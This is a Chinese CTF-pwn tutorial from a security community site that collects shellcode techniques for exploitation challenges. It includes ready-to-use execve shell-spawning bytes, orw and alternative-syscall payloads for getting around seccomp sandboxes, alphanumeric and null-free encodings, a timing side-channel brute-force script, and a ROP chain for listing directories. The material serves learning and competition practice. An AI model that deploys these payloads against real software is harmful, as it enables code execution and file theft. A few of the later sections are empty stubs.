# 总结在 CTF-PWN 中遇到的 shellcode 利用-先知社区

> **来源**: https://xz.aliyun.com/news/16107  
> **文章ID**: 16107

---

[TOC]

## 一、关于shellcode

`shellcode` 是通过软件漏洞执行的代码，通常用十六进制机器码表示，因其能够使攻击者获得 shell 而得名。它常采用机器语言编写

在栈溢出攻击中，攻击者会劫持程序流指向 `shellcode` 的地址，让程序执行 `shellcode` 中的任意指令

为了防御此类攻击，在 Linux 下通常能在编译时开启 `ASLR`、`NX` 和 `CANARY` 等保护机制，确保无法通过溢出直接劫持程序流到 `shellcode` 地址去执行攻击者的代码，或者使得数据写入的内存没有执行权限

## 二、shellcode可用性测试

仅用于测试 shellcode demo，编译后可以正确执行到 `shellcode` 并且成功执行到预期效果，说明写得没什么问题

```
// gcc -zexecstack -g -m32 -o shellcode-test shellcode-test.c

int main(){
    char shellcode[]="PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA";
    void(*run)()=(void(*)())shellcode;
    run();
    return 0;
}

```

## 三、使用pwntools生成shellcode

### 3.1 情景

题目给的输入长度足够大且没有其他特殊情况时，可以直接使用 `pwntools` 中的 `shellcraft` 模块直接生成 `shellcode` 进行利用

使用 `shellcraft` 前需要先通过 `context.arch` 设置架构为 `elf.arch`

### 3.2 生成shell

32位 getshell 的 shellcode 大小为44字节，64位的占48字节

```
context.arch = elf.arch
shellcode = asm(shellcraft.sh())

```

### 3.3 生成指定函数

用法：

```
context.arch = elf.arch
shellcode = shellcraft.function(arg1, arc2...)

```

示例：

```
context.arch = elf.arch
shellcode = shellcraft.open('./flag')

```

## 四、绕过沙箱

### 4.1 检查沙箱限制

使用 `seccomp-tools` 工具检查沙箱

```
$seccomp-tools dump ./pwn

```

置于 exp 中

```
r = process(["seccomp-tools", "dump", "./pwn"])

```

### 4.2 禁用execve绕过

绕过方式：通过组合使用 `open read write` 获取 `flag`

32位下的 `orw shellcode` 大小为55字节

```
shellcode = ''
shellcode += shellcraft.open('./flag')
shellcode += shellcraft.read('eax','esp',0x100)
shellcode += shellcraft.write(1,'esp',0x100)
shellcode = asm(shellcode)

```

64位下的 `orw shellcode` 大小为66字节

```
shellcode = ''
shellcode += shellcraft.open('./flag')
shellcode += shellcraft.read('rax','rsp',0x100)
shellcode += shellcraft.write(1,'rsp',0x100)
shellcode = asm(shellcode)

```

### 4.3 禁用open/read/write绕过

绕过方式：利用其他函数替代`open`/`read`/`write`，如下

#### openat + mmap + sendfile

```
shellcode = shellcraft.openat(0,'/flag',0)
shellcode += shellcraft.mmap(0x10000,0x100,1,1,'eax',0)
shellcode += shellcraft.sendfile(1,3,0,0x100)
shellcode = asm(shellcode)

```

#### openat + preadv2 + writev

需要根据具体情况调整

```
shellcode = asm('''
        /* openat(fd=-0x64, file='flag', oflag=0) */
        add rax, 0x62
        mov r12, rax
        mov rsi, rax
        mov rdi, -0x64
        /* call openat() */
        mov rax, 0x101 /* 0x101 */
        syscall
        /* preadv2(vararg_0=3, vararg_1=0x1337090, vararg_2=1, vararg_3=0, vararg_4=0) */
        mov rdi, 3
        mov rdx, 0x1
        add r12, 0x15
        mov rsi, r12
        /* call preadv2() */
        mov rax, 327
        syscall
        /* writev(fd=1, iovec=0x1337090, count=1) */
        mov rdi, 1
        mov rdx, 0x1
        /* call writev() */
        mov rax, 0x14
        syscall
''')

```

#### 其他替代函数

* open 替代函数  
  fopen、creat、openat、fopen64、open64、freopen、openat2
* read 替代函数  
  pread、readv、preadv、splice、mmap、preadv2
* write 替代函数  
  pwrite、send、writev

### 4.4 禁用输出绕过

绕过方式：使用侧信道逐位爆破，当爆破字符和`flag`对应字符一致时进入死循环，通过接收回显的时间间隔判断爆破是否正确

```
from pwn import *
import string

# 这里的pwn只是为了演示流程，具体逻辑还得看题目
def pwn(p, index, ch):
    code = "push 0x67616c66; mov rdi, rsp; mov rsi, 0x0; mov rax, 0x2; syscall;"  # open
    code += "mov rdi, 0x3; mov rsi, rsp; mov rdx, 0x30; mov rax, 0x0; syscall;"   # read
    code += "cmp byte ptr[rsi+{}], {}; jz loop;".format(index, ch)                # cmp
    code += "xor edi, edi; mov rax, 60; syscall; loop: jmp loop;"                 # 等则进入死循环，否则exit(0)
    code = b"\\\\x90"*20+asm(code)  # 前面加了\\\\x90滑板

    p.send(code)

def main():
    flag = ""
    flag_str = string.printable
    for offset in range(0x30):
        index = 0
        while True:
            p = process("./babystack")
            try:
                ch = flag_str[index]
                print(">>>>>>>>>>> test ch {}".format(ch))
                pwn(p, offset, ord(flag_str[index]))
                p.recv(timeout=1)
                flag += ch
                print(">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> find flag: ", flag)
                p.close()
                index += 1
                break
            except Exception as e:
                # 捕获p.recv产生的错误
                print("="*10)
                print(e)
                print("="*10)
                try:
                    p.close()
                    index += 1
                except Exception as e:
                    # 捕获p.close产生的错误
                    print("="*10)
                    print(e)
                    print("="*10)
                    continue
        if flag[-1] == "}":
            # 判断flag是否已经结束
            break

main()

```

### 4.5 切换架构

绕过方式：通过 retfq 切换架构为32位之后利用32位的函数，相应的系统调用对应关系如下

| 64位 | 32位 |
| --- | --- |
| fstat | open |
| stat | write |

### 4.6 利用ptrace

## 五、绕过其他限制

### 5.1 严格限制输入长度

#### 利用短字节shellcode

##### 32位

`getshell` - 21字节

```
# (execve("/bin/sh",NULL,NULL))
shellcode = asm("""
    push 0x68732f
    push 0x6e69622f
    mov ebx,esp
    xor ecx,ecx
    xor edx,edx
    push 11
    pop eax
    int 0x80
""")

```

`orw` - 56字节

```
shellcode = asm("""
    /*open(./flag)*/
    push 0x1010101
    xor dword ptr [esp], 0x1016660
    push 0x6c662f2e
    mov eax,0x5
    mov ebx,esp
    xor ecx,ecx
    int 0x80
    /*read(fd,buf,0x100)*/
    mov ebx,eax
    mov ecx,esp
    mov edx,0x30
    mov eax,0x3
    int 0x80
    /*write(1,buf,0x100)*/
    mov ebx,0x1
    mov eax,0x4
    int 0x80
""")

```

无 `\x00` 截断 `getshell` - 21字节

```
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```

`scanf` 可读取 `getshell` - 41字节

```
\xeb\x1b\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x29\xc0\xaa\x89\xf9\x89\xf0\xab\x89\xfa\x29\xc0\xab\xb0\x08\x04\x03\xcd\x80\xe8\xe0\xff\xff\xff/bin/sh
```

##### 64位

`getshell` - 22字节

```
shellcode = asm("""
    mov rbx, 0x68732f6e69622f
    push rbx
    push rsp
    pop rdi
    xor esi,esi
    xor edx,edx
    push 0x3b
    pop rax
    syscall
""")

```

`orw` - 43字节

```
shellcode = asm("""
    push 0x67616c66
    mov rdi,rsp
    xor esi,esi
    push 2
    pop rax
    syscall
    mov rdi,rax
    mov rsi,rsp
    mov edx,0x100
    xor eax,eax
    syscall
    mov edi,1
    mov rsi,rsp
    push 1
    pop rax
    syscall
""")

```

无 `\x00` 截断且 `scanf` 可读 - 22字节

```
\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05
```

#### 再次构造read

绕过方式：在有限的输入中构造一次 `read`，向第一次的输入点末尾继续填入 `shellcode`，这种思路也可以用于

1. 绕过第一次输入时限制输入内容的情况，再次读的 `shellcode` 内容不会受限制
2. 绕过第一次输入长度非常严格的情况

需要根据已知寄存器的值计算得到第一次输入结尾的位置，构造 `read(0, addr, len)`，在高版本 libc 中 `len` 不能过大，需要去构造

#### 利用栈或寄存器

利用寄存器中已有的值或从栈中`pop`栈顶的值得到一个离所需地址更进的地址，在此基础上构造所需地址

#### \x00截断绕过长度判断

当题目采用 `strlen` 进行 `shellcode` 长度检测的时候可以在 `shellcode` 前加 `\x00` 开头的指令绕过长度检测。64位的指令如下，32位架构下寄存器会改下名，`opcode` 不变

```
00 40 00                 add    BYTE PTR [rax+0x0],  al
00 41 00                 add    BYTE PTR [rcx+0x0],  al
00 42 00                 add    BYTE PTR [rdx+0x0],  al
00 43 00                 add    BYTE PTR [rbx+0x0],  al
00 45 00                 add    BYTE PTR [rbp+0x0],  al
00 46 00                 add    BYTE PTR [rsi+0x0],  al
00 47 00                 add    BYTE PTR [rdi+0x0],  al
```

另外可以直接采取 `\x00\x00` 的方式

#### 利用汇编技巧压缩指令长度

利用 `xor rax, rax` 代替 `mov rax, 0` 或 `sub rax, rax`

利用 `cdq` 将 `rdi` 改成 `rax` 高位（`rax` 恰好为0，且需要改 `rdi` 为0的情况可用）

### 5.2 限制输入内容

#### 仅数字字母

[alpha3](https://github.com/TaQini/alpha3) 项目可以实现输出可见 shellcode，安装和使用方法如下

```
$ git clone <https://github.com/TaQini/alpha3.git>
$ python sc.py > shellcode
$ cd alpha3
$ ./shellcode_x64.sh rax

```

使用脚本生成

```
from pwn import *
import os

context(arch='amd64', os='linux')
context.log_level = 'debug'

fp = open("shellcode", "wb+")
fp.write(asm(shellcraft.sh()))
fp.close()

shellcode = os.popen("python ./alpha3/ALPHA3.py x64 ascii mixedcase rax --input=shellcode").read()

print shellcode

```

**注意：alpha3 生成 shellcode 时如果设置 rax 那么跳转至 shellcode 时 rax 必须为 shellcode 的地址。设置为其他寄存器同理**

* 32 位（70字节，eax）

  ```
  hffffk4diFkTpj02Tpk0T0AuEE2O092w390k0Z0X7L0J0X137O080Y065N4o114C3m3H01
  ```
* 64 位（105字节，rax）

  ```
  Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M15103S0g0x4L1L0R2n1n0W7K7o0Y7K0d2m4B0U380a050W
  ```
* 64 位（271字节，rdi）

  ```
  Wh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M7M1o1M170Y172y0h16110j100o0Z0J131k1217100Z110Y0i0Z0Y09110k0x2I100i0i020W130e0F0x0x0V0c0Z0u0A2n101k0t2K0h0i0t180y0D132F110M130y120c102n102q141N117K110a122k112H102O17031709102Z172q102q122L162L110e120S102u121N107o00
  ```
* 32 位

  ```
  PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA
  ```
* 64 位

  ```
  Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t
  ```

#### 禁用\x0f\x05

绕过思路：利用 `xor` 通过数值计算得到 `syscall` 或者切换到32位架构下使用 `int 80`

示例：限制输入长度且限制 `\x0f\x05` 时利用 `xor` 构造 `read`（末尾 `push rax` 仅为凑长度）

```
push 0x66666963
pop rsi
xor qword ptr [rax + 0x20], rsi
push rbx
pop rdi
xor al, 0x22
push rax
pop rsi
push 0x66666963
pop rdx
push rbx
pop rax
push rax
push rax
push rax
push rax
push rax
push rax
\x6c\x6c\x66\x66
```

### 5.3 限制权限

#### 限制shellcode段没有读写权限

输入了 `shellcode` 之后将该段改成不可读写，可以利用 `mprotect` 给这段读写权限，并再次利用 `read` 写到该段去执行

`mprotect` 用法

```
#include <unistd.h>
#include <sys/mmap.h>
int mprotect(const void *start, size_t len, int prot);

```

说明：

指定的内存区间必须包含整个内存页 (4K)，区间开始的地址 `start` 必须是一个内存页的起始地址，并且区间长度 `len` 必须是页大小的整数倍。

如果执行成功，则返回 0 ；如果执行失败，则返回 -1 ，并且设置 `errno` 变量，说明具体因为什么原因造成调用失败

#### 限制远程没有读flag的权限

先执行 `setuid(0)` 再执行 `execve` 进行 `getshell`

#### 远程flag文件名未知

获取文件列表

```
p += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_ret) + p64(target) + p64(pop_rdx_rbx_ret) + p64(0x100) * 2 + p64(read_addr)
p += p64(pop_rdi_ret) + p64(target) + p64(pop_rsi_ret) + p64(0) + p64(pop_rdx_rbx_ret) + p64(0x0) * 2 + p64(open_addr)
p += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(0x404500) + p64(pop_rdx_rbx_ret) + p64(0x400) * 2 + p64(getdents64)
p += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(0x404500) + p64(pop_rdx_rbx_ret) + p64(0x400) * 2 + p64(write_addr)

```

### 5.4 限制只能输入浮点数

float shellcode
